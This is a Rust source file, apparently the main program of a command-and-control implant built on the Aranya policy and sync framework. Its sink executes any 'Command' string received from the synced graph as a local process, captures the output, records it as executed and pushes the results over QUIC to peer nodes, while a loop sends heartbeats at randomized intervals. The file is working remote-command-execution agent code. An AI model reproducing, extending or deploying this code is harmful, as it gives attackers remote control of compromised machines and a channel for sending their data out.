mod common;
mod config;
mod policy;
mod c2syncer;

use std::{
    net::{
        IpAddr,
        Ipv4Addr,
        SocketAddr,
    },
    rc::Rc,
    cell::RefCell,
    sync::Arc,
};
use aranya_policy_vm::{text, Text};
use aranya_runtime::{storage::GraphId, Sink, VmEffect, vm_action};
use aranya_crypto::BaseId;
use s2n_quic::Client;
use tokio::{time::{Duration, sleep}};
use crate::{c2syncer::{C2Syncer, c2push, c2sync, new_quic_client, run_c2syncer}, common::{AM, C2Client}, policy::command_executed};
use tokio::sync::Mutex;
use chrono::prelude::*;
use rand::seq::IndexedRandom;

struct C2Sink {
    pub client: Option<Arc<C2Client<C2Sink>>>,
    pub syncer: Option<Arc<Client>>,
}

impl Sink<VmEffect> for C2Sink {
    fn begin(&mut self) {
        // NOTE: No operation
    }

    fn commit(&mut self) {
        // NOTE: No operation
    }

    fn consume(&mut self, effect: VmEffect) {
        if effect.name == "Command" {
            if let aranya_policy_vm::Value::String(s) = effect.fields[0].value() {
                print!("COMMAND:{}\n", s.trim());
                let out = std::process::Command::new(s.trim()).output().expect("Error exec command");
                let stdout = String::from_utf8(out.stdout).expect("Output string fail");

                let clientr = &self.client.as_ref();
                let syncerr = &self.syncer.as_ref();

                if let Some(client) = clientr.cloned() && let Some(syncer) = syncerr.cloned() {
                    tokio::spawn(async move {
                        let a: Text = stdout.try_into().expect("String to Text fail");
                        let syncaddrs = {
                            let syncerl = client.c2syncerm.lock().await;
                            syncerl.connections.to_vec()
                        };
                        
                        {
                            client.do_action(vm_action!(command_executed(effect.command, a))).await;
                        }

                        let syncerm = {
                            Arc::clone(&client.c2syncerm)
                        };

                        for addr in syncaddrs {
                            c2push(addr, Arc::clone(&syncer), Arc::clone(&syncerm)).await;

                            // Need to sleep otherwise connection will
                            //   not be made for some reason
                            sleep(Duration::from_millis(10)).await;
                        }
                    });
                }
            }
        }
    }

    fn rollback(&mut self) {
        // NOTE: No operation
    }
}

fn main() {
    // Enable logging to terminal 
    tracing_subscriber::fmt().init();

    // Create new async runtime for the Aranya syncer.
    //   It needs a lot of stack memory
    let rt = tokio::runtime::Builder::new_multi_thread()
        .thread_stack_size(100 * 1024 * 1024)
        .enable_all()
        .build()
        .unwrap();

    let mut ips: Vec<std::net::IpAddr> =
        dns_lookup::lookup_host(config::DOMAIN).unwrap().collect();
    
    // let bind = SocketAddr::new(IpAddr::V4(Ipv4Addr::new(0, 0, 0, 0)), config::PORT);

    // TODO: TEMPORARY
    let args: Vec<String> = std::env::args().collect();
    let bind = args[1].parse().expect("IPv4 address in wrong format i.e. 127.0.0.1:1234");
    // TODO: END TEMPORARY

    rt.block_on(async move {
        // Set up Aranya
        let mut aranya = common::C2Client::init(
            config::POLICY.to_string(),
            bind,
            C2Sink {
                client: None,
                syncer: None
            }
        ).unwrap();

        let graph = GraphId::decode(config::GRAPH).unwrap();
        aranya.set_graph(graph);
        print!("Working on Graph ID `{}`\n", graph);

        let mut syncbind = bind.clone();
        syncbind.set_port(4446);
        let quic = Arc::new(new_quic_client(syncbind));

        tokio::spawn(
            run_c2syncer(
                Arc::clone(&aranya.c2syncerm),
                Arc::clone(&quic),
                bind
            )
        );

        let aranyaa = Arc::new(aranya);
        let aranya = Arc::clone(&aranyaa);
        
        {
            let mut sink = aranya.sink.lock().await;
            sink.client = Some(Arc::clone(&aranyaa));
            sink.syncer = Some(Arc::clone(&quic));
        }


        // Syncing logic loop
        loop {
            // print!("{:?} | Loop start\n", bind);
            // Stall for a random amount of time
            sleep(Duration::from_millis(rand::random_range(1000..2000))).await;

            // Sync up with some nodes

            let syncaddrs = {
                let syncerl = aranya.c2syncerm.lock().await;
                syncerl.connections.to_vec()
            };

            println!("{bind} {:?}", syncaddrs);

            // let mut max = 5;
            
            // for chosen in syncaddrs {
                // // for i in 1..20 {
                    //     // if let Some(mut chosen) = syncaddrs.choose(&mut rand::rng()) {
            //         let mut syncaddr = chosen;
            //         syncaddr.set_port(config::PORT);
            //         c2push(
                //             syncaddr,
            //             &quic,
            //             Arc::clone(&aranya.c2syncerm)
            //         ).await;
            //     // }
            // // }
            // }
            
            aranya.do_action(vm_action!(heartbeat())).await;

            let syncaddrs = {
                let syncer = aranya.c2syncerm.lock().await;
                syncer.connections.to_vec()
            };

            for addr in syncaddrs {
                c2push(
                    addr,
                    Arc::clone(&quic),
                    Arc::clone(&aranya.c2syncerm)
                ).await;

                // Need to sleep otherwise connection will
                //   not be made for some reason
                sleep(Duration::from_millis(10)).await;
            }

            // print!("{:?} | Loop end\n", bind);
        }
    });
}
